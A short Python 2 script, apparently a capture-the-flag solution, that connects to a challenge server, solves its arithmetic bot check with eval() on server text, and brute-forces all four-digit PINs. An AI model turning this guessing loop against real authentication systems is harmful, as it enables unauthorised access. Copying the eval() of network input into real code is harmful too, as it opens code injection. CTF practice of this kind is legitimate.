import socket
import re
import time


# Are you human? Answer this question: 37 - 56 = 
find = re.compile(": (\d+)\s(.)\s(\d+)")

def ctf_connect(pin):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('challenges.kaizen-ctf.com', 31337))
        line = s.recv(8192)
        print line
        matches = find.findall(line)[0]
        print matches[0], matches[1], matches[2]
        res = str(eval(' '.join(matches))) + '\n'
        time.sleep(1)
        print res
        s.sendall(res)
        line = s.recv(8192)
        print "challenge line:", line
        s.sendall(pin + "\n")
        line = s.recv(8192)
        print "result: ", line
        s.close()
    except:
        pass

if __name__ == "__main__":
    for idx in range(0, 10000):
        pin = "{:04d}".format(idx)
        print "Trying PIN: {0}".format(pin)
        ctf_connect(pin)
